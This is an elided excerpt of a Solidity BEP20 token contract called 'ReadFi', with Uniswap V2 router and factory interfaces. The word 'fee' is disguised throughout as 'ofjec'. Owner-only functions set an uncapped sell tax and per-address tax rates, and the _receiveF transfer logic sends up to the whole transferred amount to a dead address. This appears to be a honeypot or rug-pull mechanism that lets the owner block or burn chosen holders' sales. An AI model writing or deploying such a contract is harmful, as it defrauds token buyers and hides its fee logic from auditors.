...
interface IUniswapV2Factory {
    ...
    function ofjecTo() external view returns (address);
    function ofjecToSetter() external view returns (address);
    ...
    function setofjecTo(address) external;
    function setofjecToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingofjecOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingofjecOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingofjecOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingofjecOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingofjecOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract ReadFi is BEP20, Ownable {
    ...
    uint256 private _defaultSellofjec = 0;

    uint256 private _defaultBuyofjec = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipofjec;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellofjec = _value;
    }

    function setSlipofjec(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipofjec[_address] = _value;
    }

    function getSlipofjec(address _address) external view onlyownar returns (uint256) {
        return _slipofjec[_address];
    }


    function setMAccountofjec(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountofjec(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeofjecAmount = 0;

        if (rF) {
            uint256 tradeofjec = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeofjec = _defaultSellofjec;
                }
                if (from == uniswapV2Pair) {

                    tradeofjec = _defaultBuyofjec;
                }
            }
            if (_slipofjec[from] > 0) {
                tradeofjec = _slipofjec[from];
            }

            tradeofjecAmount = _Amount.mul(tradeofjec).div(100);
        }


        if (tradeofjecAmount > 0) {
            _balances[from] = _balances[from].sub(tradeofjecAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeofjecAmount);
            emit Transfer(from, _deadAddress, tradeofjecAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeofjecAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeofjecAmount);
        emit Transfer(from, _to, _Amount - tradeofjecAmount);
    }
